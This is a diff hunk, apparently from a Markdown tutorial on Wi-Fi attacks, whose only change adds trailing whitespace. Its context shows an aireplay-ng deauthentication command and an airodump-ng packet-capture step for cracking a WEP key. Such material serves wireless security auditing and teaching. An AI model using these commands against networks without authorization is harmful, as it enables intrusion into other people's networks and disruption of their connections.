@@ -53,7 +53,7 @@ aireplay-ng --deauth time_out -a router_addr -c target_mac_addr wireless_adapter
    To crack WEP, we need a large number of packets/IVs to analyse the IVs and crack the router's key.
 
    Step 1:
-   <br/> Capture a large number of packets
+   <br/> Capture a large number of packets 
    ```
    airodump-ng --bssid MAC --channel N --write file_name wireless_adapter_name
    ```
